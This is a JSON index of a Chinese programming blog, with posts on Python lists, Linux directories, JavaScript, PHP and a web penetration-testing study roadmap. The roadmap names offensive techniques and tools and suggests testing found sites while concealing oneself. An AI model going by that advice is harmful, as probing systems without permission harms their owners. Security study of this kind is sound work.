采用分离式结构的顺序表，若将数据区更换为存储空间更大的区域，则可以在不改变表对象的前提下对其数据存储区进行了扩充，所有使用这个表的地方都不必修改。只要程序的运行环境（计算机系统）还有空闲存储，这种表结构就不会因为满了而导致操作无法进行。人们把采用这种技术实现的顺序表称为动态顺序表，因为其容量可以在使用中动态变化。 扩充的两种策略 每次扩充增加固定数目的存储位置，如每次扩充增加10个元素位置，这种策略可称为线性增长。 特点：节省空间，但是扩充操作频繁，操作次数多。 每次扩充容量加倍，如每次扩充增加一倍存储空间。 特点：减少了扩充操作的执行次数，但可能会浪费空间资源。以空间换时间，推荐的方式。 顺序表的操作 增加元素 如图所示，为顺序表增加新元素111的三种方式 a. 尾端加入元素，时间复杂度为O(1) b. 非保序的加入元素（不常见），时间复杂度为O(1) c. 保序的元素加入，时间复杂度为O(n) 删除元素 Python中的顺序表 Python中的list和tuple两种类型采用了顺序表的实现技术，具有前面讨论的顺序表的所有性质。 tuple是不可变类型，即不变的顺序表，因此不支持改变其内部状态的任何操作，而其他方面，则与list的性质类似。 list的基本实现技术 Python标准类型list就是一种元素个数可变的线性表，可以加入和删除元素，并在各种操作中维持已有元素的顺序（即保序），而且还具有以下行为特征： 基于下标（位置）的高效元素访问和更新，时间复杂度应该是O(1)； 为满足该特征，应该采用顺序表技术，表中元素保存在一块连续的存储区中。 允许任意加入元素，而且在不断加入元素的过程中，表对象的标识（函数id得到的值）不变。 为满足该特征，就必须能更换元素存储区，并且为保证更换存储区时list对象的标识id不变，只能采用分离式实现技术。 在Python的官方实现中，list就是一种采用分离式技术实现的动态顺序表。这就是为什么用list.append(x) （或 list.insert(len(list), x)，即尾部插入）比在指定位置插入元素效率高的原因。 在Python的官方实现中，list实现采用了如下的策略：在建立空表（或者很小的表）时，系统分配一块能容纳8个元素的存储区；在执行插入操作（insert或append）时，如果元素存储区满就换一块4倍大的存储区。但如果此时的表已经很大（目前的阀值为50000），则改变策略，采用加一倍的方法。引入这种改变策略的方式，是为了避免出现过多空闲的存储位置。","categories":[{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"https://xiaowuyoucy.github.io/categories/数据结构与算法/"}],"tags":[{"name":"顺序表","slug":"顺序表","permalink":"https://xiaowuyoucy.github.io/tags/顺序表/"}]},{"title":"Linux目录结构","slug":"201604150110","date":"2016-04-14T17:11:18.000Z","updated":"2019-04-14T18:02:10.469Z","comments":true,"path":"2016/04/15/201604150110/","link":"","permalink":"https://xiaowuyoucy.github.io/2016/04/15/201604150110/","excerpt":"","text":"linux 的文件系统是采用层级式的树状目录结构，在此结构中的最上一层是根目录“/” 然后在此目录下再创建其他的目录。 深刻理解Linux树状文件目录是非常重要的，linux有一句非常经典的话叫做:在linux世界里，一切皆文件。 以下是对这些目录的解释： /bin： bin是Binary的缩写, 这个目录存放着最经常使用的命令。 /boot： 这里存放的是启动Linux时使用的一些核心文件，包括一些连接文件以及镜像文件。 /dev ： dev是Device(设备)的缩写, 该目录下存放的是Linux的外部设备，在Linux中访问设备的方式和访问文件的方式是相同的。 /dev ： dev是Device(设备)的缩写, 该目录下存放的是Linux的外部设备，在Linux中访问设备的方式和访问文件的方式是相同的。 /etc： 这个目录用来存放所有的系统管理所需要的配置文件和子目录。 /home： 用户的主目录，在Linux中，每个用户都有一个自己的目录，一般该目录名是以用户的账号命名的。 /lib： 这个目录里存放着系统最基本的动态连接共享库，其作用类似于Windows里的DLL文件。几乎所有的应用程序都需要用到这些共享库。 /lost+found： 这个目录一般情况下是空的，当系统非法关机后，这里就存放了一些文件。 /media： linux系统会自动识别一些设备，例如U盘、光驱等等，当识别后，linux会把识别的设备挂载到这个目录下。 /mnt： 系统提供该目录是为了让用户临时挂载别的文件系统的，我们可以将光驱挂载在/mnt/上，然后进入该目录就可以查看光驱里的内容了。 /opt： 这是给主机额外安装软件所摆放的目录。比如你安装一个ORACLE数据库则就可以放到这个目录下。默认是空的。 /proc： 这个目录是一个虚拟的目录，它是系统内存的映射，我们可以通过直接访问这个目录来获取系统信息。 这个目录的内容不在硬盘上而是在内存里，我们也可以直接修改里面的某些文件，比如可以通过下面的命令来屏蔽主机的ping命令，使别人无法ping你的机器： 1echo 1 &gt; /proc/sys/net/ipv4/icmp_echo_ignore_all /root： 该目录为系统管理员，也称作超级权限者的用户主目录。 /sbin： s就是Super User的意思，这里存放的是系统管理员使用的系统管理程序。 /selinux： 这个目录是Redhat/CentOS所特有的目录，Selinux是一个安全机制，类似于windows的防火墙，但是这套机制比较复杂，这个目录就是存放selinux相关的文件的。 /srv： 该目录存放一些服务启动之后需要提取的数据。 这是linux2.6内核的一个很大的变化。该目录下安装了2.6内核中新出现的一个文件系统 sysfs 。 sysfs文件系统集成了下面3种文件系统的信息：针对进程信息的proc文件系统、针对设备的devfs文件系统以及针对伪终端的devpts文件系统，该文件系统是内核设备树的一个直观反映。当一个内核对象被创建的时候，对应的文件和目录也在内核对象子系统中被创建。 /tmp： 这个目录是用来存放一些临时文件的。 /usr： 这是一个非常重要的目录，用户的很多应用程序和文件都放在这个目录下，类似于windows下的program files目录。 /usr/bin： 系统用户使用的应用程序。 /usr/sbin： 超级用户使用的比较高级的管理程序和系统守护程序。 /usr/src： 内核源代码默认的放置目录。 /var： 这个目录中存放着在不断扩充着的东西，我们习惯将那些经常被修改的目录放在这个目录下。包括各种日志文件。 /run： 是一个临时文件系统，存储系统启动以来的信息。当系统重启时，这个目录下的文件应该被删掉或清除。如果你的系统上有 /var/run 目录，应该让它指向 run。 在 Linux 系统中，有几个目录是比较重要的，平时需要注意不要误删除或者随意更改内部文件。 /etc： 上边也提到了，这个是系统中的配置文件，如果你更改了该目录下的某个文件可能会导致系统不能启动。 /bin, /sbin, /usr/bin, /usr/sbin: 这是系统预设的执行文件的放置目录，比如 ls 就是在/bin/ls 目录下的。 值得提出的是，/bin, /usr/bin 是给系统用户使用的指令（除root外的通用户），而/sbin, /usr/sbin 则是给root使用的指令。 /var： 这是一个非常重要的目录，系统上跑了很多程序，那么每个程序都会有相应的日志产生，而这些日志就被记录到这个目录下，具体在/var/log 目录下，另外mail的预设放置也是在这里。","categories":[{"name":"linux","slug":"linux","permalink":"https://xiaowuyoucy.github.io/categories/linux/"}],"tags":[{"name":"linux目录结构","slug":"linux目录结构","permalink":"https://xiaowuyoucy.github.io/tags/linux目录结构/"}]},{"title":"js-this方法","slug":"201504091559","date":"2015-04-09T07:59:18.000Z","updated":"2019-04-09T08:00:20.819Z","comments":true,"path":"2015/04/09/201504091559/","link":"","permalink":"https://xiaowuyoucy.github.io/2015/04/09/201504091559/","excerpt":"","text":"1234567891011121314151617181920212223242526272829303132333435363738394041&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Document&lt;/title&gt; &lt;script&gt; // this出现在以下位置，分别代表什么 // 1 函数中 -- this 指向Window // 2 在方法中 -- this 指向的是这个方法所属的对象 // 3 构造函数中 -- this 就是构造函数创建的对象 // 函数 // function fn() &#123; // console.log(this); // &#125; // fn(); // 对象 // var obj = &#123; // name: 'zs', // fn: function () &#123; // console.log(this.name); // &#125; // &#125;; // obj.fn(); // 构造函数 function Fn() &#123; this.name = 'zs'; this.age = 18; console.log(this); &#125; // var o = new Fn(); // 调用构造函数 Fn(); // 函数调用 &lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;/body&gt;&lt;/html&gt;","categories":[{"name":"编程开发","slug":"编程开发","permalink":"https://xiaowuyoucy.github.io/categories/编程开发/"}],"tags":[{"name":"js-this方法","slug":"js-this方法","permalink":"https://xiaowuyoucy.github.io/tags/js-this方法/"}]},{"title":"javascript函数","slug":"201504072316","date":"2015-04-07T15:16:20.000Z","updated":"2019-04-07T17:25:25.508Z","comments":true,"path":"2015/04/07/201504072316/","link":"","permalink":"https://xiaowuyoucy.github.io/2015/04/07/201504072316/","excerpt":"","text":"什么是函数 把一段相对独立的具有特定功能的代码块封装起来，形成一个独立实体，就是函数，起个名字（函数名，在后续开发中可以反复调用,函数的作用就是封装一段代码，将来可以重复使用。 函数的定义 函数声明 123function 函数名() &#123; // 函数体&#125; 函数表达式 123var fn = function () &#123; // 函数体&#125; 特定：函数声明的时候，函数体并不会执行，只要当函数被调用的时候才会执行。 函数一般都用来干一件事情，函数名称一般使用动词。 调用函数的语法 函数名(); 特点：函数体只有在调用的时候才会执行，调用需要()进行调用。可以调用多次(重复使用) 代码示例： 1234567891011121314151617// 声明函数function sayHi() &#123; console.log(\"吃了没？\");&#125;// 调用函数sayHi();// 求1-100之间所有数的和function getSum() &#123; var sum = 0; for (var i = 0; i &lt; 100; i++) &#123; sum += i; &#125; console.log(sum);&#125;// 调用getSum(); 函数的参数 为什么要有参数 12345678910function getSum() &#123; var sum = 0; for (var i = 1; i &lt;= 100; i++) &#123; sum += i; &#125; console.log();&#125;// 虽然上面代码可以重复调用，但是只能计算1-100之间的值// 如果想要计算n-m之间所有数的和，应该怎么办呢？ 语法 12345678910// 函数内部是一个封闭的环境，可以通过参数的方式，把外部的值传递给函数内部// 带参数的函数声明function 函数名(形参1, 形参2, 形参3...) &#123; // 函数体&#125;// 带参数的函数调用函数名(实参1, 实参2, 实参3); 形参1 = 实参1形参2 = 实参2 形参和实参 形式参数：在声明一个函数的时候，为了函数的功能更加灵活，有些值是固定不了的，对于这些固定不了的值。我们可以给函数设置参数。这个参数没有具体的值，仅仅起到一个占位置的作用，我们通常称之为形式参数，也叫形参。 实际参数：如果函数在声明时，设置了形参，那么在函数调用的时候就需要传入对应的参数，我们把传入的参数叫做实际参数，也叫实参。 123456var x = 5, y = 6;fn(x,y); function fn(a, b) &#123; console.log(a + b);&#125;// x,y实参，有具体的值。函数执行的时候会把x,y复制一份给函数内部的a和b，函数内部的值是复制的新值，无法修改外部的x,y 函数返回值 当函数执行完的时候，并不是所有时候都要把结果打印。我们期望函数给我一些反馈（比如计算的结果返回进行后续的运算），这个时候可以让函数返回一些东西。也就是返回值。函数通过return返回一个返回值 返回值语法： 12345678//声明一个带返回值的函数function 函数名(形参1, 形参2, 形参3...) &#123; //函数体 return 返回值;&#125;//可以通过变量来接收这个返回值var 变量 = 函数名(实参1, 实参2, 实参3...);","categories":[{"name":"编程开发","slug":"编程开发","permalink":"https://xiaowuyoucy.github.io/categories/编程开发/"}],"tags":[{"name":"javascript函数","slug":"javascript函数","permalink":"https://xiaowuyoucy.github.io/tags/javascript函数/"}]},{"title":"while和dowhile循环","slug":"201504051853","date":"2015-04-04T20:13:18.000Z","updated":"2019-04-05T11:35:51.671Z","comments":true,"path":"2015/04/05/201504051853/","link":"","permalink":"https://xiaowuyoucy.github.io/2015/04/05/201504051853/","excerpt":"","text":"while与 do while 的区别： while：先判断再执行。 do…while：先执行再判断。（无论如何会执行一次循环体里面的代码，二while循环有可能一次都不会执行） 12345678910111213141516171819202122232425262728293031323334353637383940&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;script&gt; // 案例一：小盒子身上有100元，用while输出能吃多少次米线，一碗米线12元，最终还剩下多少钱。 var money = 100; while(money &gt;= 12)&#123; money -=12; console.log('我吃了一碗米线,还剩'+money+'元') &#125; //案例二：小盒子身上没钱了，吃了个霸王餐，用do...while实现。 do&#123; var money = 5; console.log(\"小盒子正在吃米线\"); money-=12 &#125;while(money&gt;=12) console.log(\"小盒子身上没钱了，吃了个霸王餐\");// 使用do-while循环：输出询问“我爱你，嫁给我吧？”，选择“你喜欢我吗？(y/n):\"，如果输入为y则打印”我们形影不离“，若输入为n,则继续询问 do &#123; var msg = prompt('你到底爱不爱我？', '请输入yes/no'); &#125; while (msg !== 'yes'); console.log('亲亲我的宝贝'); &lt;/script&gt; &lt;/body&gt; &lt;/html&gt;","categories":[{"name":"编程开发","slug":"编程开发","permalink":"https://xiaowuyoucy.github.io/categories/编程开发/"}],"tags":[{"name":"dowhile循环","slug":"dowhile循环","permalink":"https://xiaowuyoucy.github.io/tags/dowhile循环/"}]},{"title":"js布尔类型的隐私转换","slug":"201804051318","date":"2015-04-04T20:13:18.000Z","updated":"2019-04-08T03:27:01.009Z","comments":true,"path":"2015/04/05/201804051318/","link":"","permalink":"https://xiaowuyoucy.github.io/2015/04/05/201804051318/","excerpt":"","text":"123456789101112131415161718192021222324252627282930313233&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Document&lt;/title&gt; &lt;script&gt; // var num = 0; // console.log(Boolean(num)); // 转换成false的情况 0 ''空字符串 NaN null undefined // 隐式类型转换 // if (num) &#123; // console.log('hello'); // &#125; // // // var msg; // if (msg) &#123; // console.log('hello'); // &#125; // // var str = '123'; var isOK = !!str; // Boolean(str); console.log(isOK); &lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;/body&gt;&lt;/html&gt;","categories":[{"name":"编程开发","slug":"编程开发","permalink":"https://xiaowuyoucy.github.io/categories/编程开发/"}],"tags":[{"name":"js布尔类型隐私转换","slug":"js布尔类型隐私转换","permalink":"https://xiaowuyoucy.github.io/tags/js布尔类型隐私转换/"}]},{"title":"Python内置方法的时间复杂度测试分析","slug":"20150410224","date":"2015-03-30T20:13:18.000Z","updated":"2019-04-14T18:22:26.522Z","comments":true,"path":"2015/03/31/20150410224/","link":"","permalink":"https://xiaowuyoucy.github.io/2015/03/31/20150410224/","excerpt":"","text":"timeit模块 timeit模块可以用来测试一小段Python代码的执行速度。 class timeit.Timer(stmt=‘pass’, setup=‘pass’, timer=) Timer是测量小段代码执行速度的类。 stmt参数是要测试的代码语句（statment）； setup参数是运行代码时需要的设置； timer参数是一个定时器函数，与平台有关。 timeit.Timer.timeit(number=1000000) Timer类中测试语句执行速度的对象方法。number参数是测试代码时的测试次数，默认为1000000次。方法返回执行代码的平均耗时，一个float类型的秒数。 list的操作测试 12345678910111213141516171819202122232425262728def test1(): l = [] for i in range(1000): l = l + [i]def test2(): l = [] for i in range(1000): l.append(i)def test3(): l = [i for i in range(1000)]def test4(): l = list(range(1000))from timeit import Timert1 = Timer(\"test1()\", \"from __main__ import test1\")print(\"concat \",t1.timeit(number=1000), \"seconds\")t2 = Timer(\"test2()\", \"from __main__ import test2\")print(\"append \",t2.timeit(number=1000), \"seconds\")t3 = Timer(\"test3()\", \"from __main__ import test3\")print(\"comprehension \",t3.timeit(number=1000), \"seconds\")t4 = Timer(\"test4()\", \"from __main__ import test4\")print(\"list range \",t4.timeit(number=1000), \"seconds\")# ('concat ', 1.7890608310699463, 'seconds')# ('append ', 0.13796091079711914, 'seconds')# ('comprehension ', 0.05671119689941406, 'seconds')# ('list range ', 0.014147043228149414, 'seconds') pop操作测试 123456789x = range(2000000)pop_zero = Timer(\"x.pop(0)\",\"from __main__ import x\")print(\"pop_zero \",pop_zero.timeit(number=1000), \"seconds\")x = range(2000000)pop_end = Timer(\"x.pop()\",\"from __main__ import x\")print(\"pop_end \",pop_end.timeit(number=1000), \"seconds\")# ('pop_zero ', 1.9101738929748535, 'seconds')# ('pop_end ', 0.00023603439331054688, 'seconds') 测试pop操作：从结果可以看出，pop最后一个元素的效率远远高于pop第一个元素 可以自行尝试下list的append(value)和insert(0,value),即一个后面插入和一个前面插入？？？ list内置操作的时间复杂度 dict内置操作的时间复杂度","categories":[{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"https://xiaowuyoucy.github.io/categories/数据结构与算法/"}],"tags":[{"name":"时间复杂度测试","slug":"时间复杂度测试","permalink":"https://xiaowuyoucy.github.io/tags/时间复杂度测试/"}]},{"title":"WEB安全渗透学习指南","slug":"201502092357","date":"2015-03-09T13:33:18.000Z","updated":"2019-04-23T15:15:27.231Z","comments":true,"path":"2015/03/09/201502092357/","link":"","permalink":"https://xiaowuyoucy.github.io/2015/03/09/201502092357/","excerpt":"","text":"学习规划： 作者：向生李 链接：http://www.zhihu.com/question/21914899/answer/39344435 来源：知乎 著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。 Web安全相关概念 熟悉基本概念（SQL注入、上传、XSS、CSRF、一句话木马等）。 通过关键字（SQL注入、上传、XSS、CSRF、一句话木马等）进行Google/SecWiki； 阅读《精通脚本黑客》，虽然很旧也有错误，但是入门还是可以的； 看一些渗透笔记/视频，了解渗透实战的整个过程，可以Google（渗透笔记、渗透过程、入侵过程等）； 3周 熟悉渗透相关工具 熟悉AWVS、sqlmap、Burp、nessus、chopper、nmap、Appscan等相关工具的使用。 了解该类工具的用途和使用场景，先用软件名字Google/SecWiki； 下载无后们版的这些软件进行安装； 学习并进行使用，具体教材可以在SecWiki上搜索，例如：Brup的教程、sqlmap； 待常用的这几个软件都学会了可以安装音速启动做一个渗透工具箱； 5周 渗透实战操作掌握渗透的整个阶段并能够独立渗透小型站点。 网上找渗透视频看并思考其中的思路和原理，关键字（渗透、SQL注入视频、文件上传入侵、数据库备份、dedecms漏洞利用等等）； 自己找站点/搭建测试环境进行测试，记住请隐藏好你自己； 思考渗透主要分为几个阶段，每个阶段需要做那些工作，例如这个：PTES渗透测试执行标准； 研究SQL注入的种类、注入原理、手动注入技巧； 研究文件上传的原理，如何进行截断、双重后缀欺骗(IIS、PHP)、解析漏洞利用（IIS、Nignix、Apache）等，参照：上传攻击框架； 研究XSS形成的原理和种类，具体学习方法可以Google/SecWiki，可以参考：XSS； 研究Windows/Linux提权的方法和具体使用， 可以参考：提权； 可以参考: 开源渗透测试脆弱系统； 1周 关注安全圈动态 关注安全圈的最新漏洞、安全事件与技术文章。 通过SecWiki浏览每日的安全技术文章/事件； 通过Weibo/twitter关注安全圈的从业人员（遇到大牛的关注或者好友果断关注），天天抽时间刷一下； 通过feedly/鲜果订阅国内外安全技术博客（不要仅限于国内，平时多注意积累），没有订阅源的可以看一下SecWiki的聚合栏目； 养成习惯，每天主动提交安全技术文章链接到SecWiki进行积淀； 多关注下最新漏洞列表，推荐几个：exploit-db、CVE中文库、Wooyun等，遇到公开的漏洞都去实践下。 关注国内国际上的安全会议的议题或者录像，推荐SecWiki-Conference。 3周 熟悉Windows/Kali Linux 学习Windows/Kali Linux基本命令、常用工具； 熟悉Windows下的常用的cmd命令，例如：ipconfig,nslookup,tracert,net,tasklist,taskkill等； 熟悉Linux下的常用命令，例如：ifconfig,ls,cp,mv,vi,wget,service,sudo等； 熟悉Kali Linux系统下的常用工具，可以参考SecWiki,《Web Penetration Testing with Kali Linux》、《Hacking with Kali》等； 熟悉metasploit工具，可以参考SecWiki、《Metasploit渗透测试指南》。 3周 服务器安全配置 学习服务器环境配置，并能通过思考发现配置存在的安全问题。 Windows2003/2008环境下的IIS配置，特别注意配置安全和运行权限，可以参考：SecWiki-配置； Linux环境下的LAMP的安全配置，主要考虑运行权限、跨目录、文件夹权限等，可以参考：SecWiki-配置； 远程系统加固，限制用户名和口令登陆，通过iptables限制端口； 配置软件Waf加强系统安全，在服务器配置mod_security等系统，参见SecWiki-ModSecurity； 通过Nessus软件对配置环境进行安全检测，发现未知安全威胁。 4周 脚本编程学习 选择脚本语言Perl/Python/PHP/Go/Java中的一种，对常用库进行编程学习。 搭建开发环境和选择IDE，PHP环境推荐Wamp和XAMPP，IDE强烈推荐Sublime，一些Sublime的技巧：SecWiki-Sublime； Python编程学习，学习内容包含：语法、正则、文件、网络、多线程等常用库，推荐《Python核心编程》，不要看完； 用Python编写漏洞的exp，然后写一个简单的网络爬虫，可参见SecWiki-爬虫、视频； PHP基本语法学习并书写一个简单的博客系统，参见《PHP与MySQL程序设计（第4版）》、视频； 熟悉MVC架构，并试着学习一个PHP框架或者Python框架（可选）； 了解Bootstrap的布局或者CSS，可以参考：SecWiki-Bootstrap; 3周 源码审计与漏洞分析 能独立分析脚本源码程序并发现安全问题。 熟悉源码审计的动态和静态方法，并知道如何去分析程序，参见SecWiki-审计； 从Wooyun上寻找开源程序的漏洞进行分析并试着自己分析； 了解Web漏洞的形成原因，然后通过关键字进行查找分析，参见SecWiki-代码审计、高级PHP应用程序漏洞审核技术； 研究Web漏洞形成原理和如何从源码层面避免该类漏洞，并整理成checklist。 5周 安全体系设计与开发 能建立自己的安全体系，并能提出一些安全建议或者系统架构。 开发一些实用的安全小工具并开源，体现个人实力； 建立自己的安全体系，对公司安全有自己的一些认识和见解； 提出或者加入大型安全系统的架构或者开发；","categories":[{"name":"WEB安全渗透","slug":"WEB安全渗透","permalink":"https://xiaowuyoucy.github.io/categories/WEB安全渗透/"}],"tags":[{"name":"web安全渗透","slug":"web安全渗透","permalink":"https://xiaowuyoucy.github.io/tags/web安全渗透/"}]},{"title":"PHP变量的4个基本操作","slug":"201409240457","date":"2014-09-23T21:00:00.000Z","updated":"2019-09-24T17:59:22.040Z","comments":true,"path":"2014/09/24/201409240457/","link":"","permalink":"https://xiaowuyoucy.github.io/2014/09/24/201409240457/","excerpt":"","text":"1 赋值操作 123456789101112131415161718&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;?php $name = \"PHP是世界上最好的语言\"; # 将数值1放入到变量（V1）中 #变量初始赋值后，可以后续再去重新赋值——这就是修改了变量的值，比如： #$name = “PHP不是世界上最好的语言”; ?&gt;&lt;/body&gt;&lt;/html&gt; 变量赋值的本质是：将变量名，跟一个数据“建立关联（联系） 2 取值操作 取值，就是，从变量这个容器中拿到其中存储的数据（值）； 取值无处不在：凡是使用到变量，并在该位置上，需要一个“数据”的时候，就会发生取值操作 3 判断变量isset() 就是判断一个“变量名”是否里面存储了数据！ 判断的结果是：true（真，表示有），或者false（假，表示没有）。 使用这个语法来判断：isset( $变量名 ); 还有一个特殊的赋值，赋值后，变量中也没有数据，如下： $v5 = null; //null是一个特殊的“数据”（值），该数据的含义是：没有数据。 即此时判断 isset($v5)的结果是“false”。 4 删除/销毁变量unset() 123456789101112131415161718&lt;?php $v1 = 1;$result = isset($v1); //将对变量v1的判断结果放到$result中echo $result; //实际结果是“true”，但echo输出后为“1”echo \"&lt;br&gt;\";var_dump($result); //这也是输出！ //var_dump()可以输出一个变量的完整信息$result2 = isset($v3);echo \"&lt;br&gt;v3的结果为：\";var_dump($result2);//下面演示unset掉一个变量后的结果：unset($v1); //销毁该变量！$result3 = isset($v1);echo \"&lt;br&gt;v1被unset()之后为：\";var_dump($result3);echo $v1; ?&gt; 当一个变量中存储了数据，我们也可以去销毁（删除）它，语法如下： unset( $变量名 ）。 删除变量的本质是：断开变量名跟其关联过的那个数据之间的“联系”，图示如下： 此时，该变量就不再指向某个数据了，其isset()判断的结果为false。","categories":[{"name":"PHP","slug":"PHP","permalink":"https://xiaowuyoucy.github.io/categories/PHP/"}],"tags":[{"name":"php变量","slug":"php变量","permalink":"https://xiaowuyoucy.github.io/tags/php变量/"},{"name":"变量的操作","slug":"变量的操作","permalink":"https://xiaowuyoucy.github.io/tags/变量的操作/"}]},{"title":"PHP中的4个预定义变量","slug":"201409240602","date":"2014-09-23T21:00:00.000Z","updated":"2019-09-24T13:45:36.071Z","comments":true,"path":"2014/09/24/201409240602/","link":"","permalink":"https://xiaowuyoucy.github.io/2014/09/24/201409240602/","excerpt":"","text":"$_GET 代表浏览器表单通过“get”方式提交的所有数据（集），可以称为“get数据”。 也可以理解为： $_GET变量里面会“自动存储”（保存/装载）提交到某个文件中的GET数据。 而GET数据，是在一个页面以“get”方式请求的时候提交的数据。 代码演示： 制作一个表单，有两个输入框，可以输出数字，并提交。 到另一个页面（文件）中，计算这两个数字的和！ 对该加法计算的一个改进： $_POST 代表浏览器表单通过“post”方式提交的所有数据（集），可以称为“POST数据”。 也可以理解为： $_POST变量里面会“自动存储”（保存/装载）提交到某个文件中的POST数据。 而POST数据，是在一个表单中以“post”方式提交的数据。 代码演示： 有个表单，两个输入框，可以填写数字，有一个“提交按钮”，点击提交，可以计算他们的和并输出。 扩展（提交给自己！）： $_REQUEST 代表浏览器通过“get”方式 或 “post”方式提交的数据的合集。 即：它既能接收到get过来的数据，也能接收到post过来的数据！ 通常，一个表单，只提交一种形式的数据，要么get数据，要么post数据！ 代码演示： 但，有一个情况，提交post数据的同时，也可以提交get数据： $_SERVER 它代表任何一次请求中，客户端或服务器端的一些“基本信息”或系统信息，包括很多（10多项）。 我们无非就是要知道，哪些信息是可以供我们使用的！ 常用的有： PHP_SELF： 表示当前请求的网页地址（不含域名部分） SERVER_NAME： 表示当前请求的服务器名 SERVER_ADDR： 表示当前请求的服务器IP地址 DOCUMENT_ROOT： 表示当前请求的网站物理路径（apache设置站点时那个） REMOTE_ADDR： 表示当前请求的客户端的IP地址 SCRIPT_NAME： 表示当前网页地址 代码演示：","categories":[{"name":"PHP","slug":"PHP","permalink":"https://xiaowuyoucy.github.io/categories/PHP/"}],"tags":[{"name":"$_GET","slug":"GET","permalink":"https://xiaowuyoucy.github.io/tags/GET/"},{"name":"$_POST，$_SERVER","slug":"POST，-SERVER","permalink":"https://xiaowuyoucy.github.io/tags/POST，-SERVER/"},{"name":"$_REQUEST","slug":"REQUEST","permalink":"https://xiaowuyoucy.github.io/tags/REQUEST/"}]},{"title":"PHP常量","slug":"201409242200","date":"2014-09-23T21:00:00.000Z","updated":"2019-09-24T15:59:31.901Z","comments":true,"path":"2014/09/24/201409242200/","link":"","permalink":"https://xiaowuyoucy.github.io/2014/09/24/201409242200/","excerpt":"","text":"define()函数形式： define(‘常量名’, 对应的常量值); 常量名推荐使用“全大写”。 const关键字定义： const 常量名 = 对应的常量值; 演示： 常量的两种取值形式 直接使用： echo 常量名； //注意：使用常量，前面不带”$”符号，也不能有引号 使用constant()函数以取值： echo constant(‘常量名’); //注意，此时常量名要用引号引起来。 变量与常量的区别： 1，变量的数据可以变化（重新赋值），常量不可以。 2，变量可以存储各种数据类型，而常量只能存储简单数据类型。 3，给变量赋值可以是“计算”结果，但给常量赋值，只能是“直接写出的值”（字面值） 判断一个常量是否存在：defined(); 判断的结果返回：true（表示存在）或false（表示不存在） 形式： if（ defined (‘常量名’) ) { //如果该常量名存在，则… //…做什么事情。。。。 } 演示：","categories":[{"name":"PHP","slug":"PHP","permalink":"https://xiaowuyoucy.github.io/categories/PHP/"}],"tags":[{"name":"PHP常量","slug":"PHP常量","permalink":"https://xiaowuyoucy.github.io/tags/PHP常量/"},{"name":"PHP两种定义常量的形式","slug":"PHP两种定义常量的形式","permalink":"https://xiaowuyoucy.github.io/tags/PHP两种定义常量的形式/"}]},{"title":"PHP中的3个魔术常量","slug":"201909250033","date":"2014-09-23T16:33:00.000Z","updated":"2019-09-24T16:37:00.239Z","comments":true,"path":"2014/09/24/201909250033/","link":"","permalink":"https://xiaowuyoucy.github.io/2014/09/24/201909250033/","excerpt":"","text":"含义： 魔术常量也是常量，只是在形式上为常量，而其值其实是“变化”的。 他们也是系统中预先定义好的，也就几个，下面是最常用的 3个： DIR ：代表当前php网页文件所在的目录 FILE ：代表当前php网页文件本身的路径 LINE, ：代表当前这个常量所在的行号","categories":[{"name":"PHP","slug":"PHP","permalink":"https://xiaowuyoucy.github.io/categories/PHP/"}],"tags":[{"name":"__DIR__","slug":"DIR","permalink":"https://xiaowuyoucy.github.io/tags/DIR/"},{"name":"__FILE__","slug":"FILE","permalink":"https://xiaowuyoucy.github.io/tags/FILE/"},{"name":"__LINE__","slug":"LINE","permalink":"https://xiaowuyoucy.github.io/tags/LINE/"}]}]}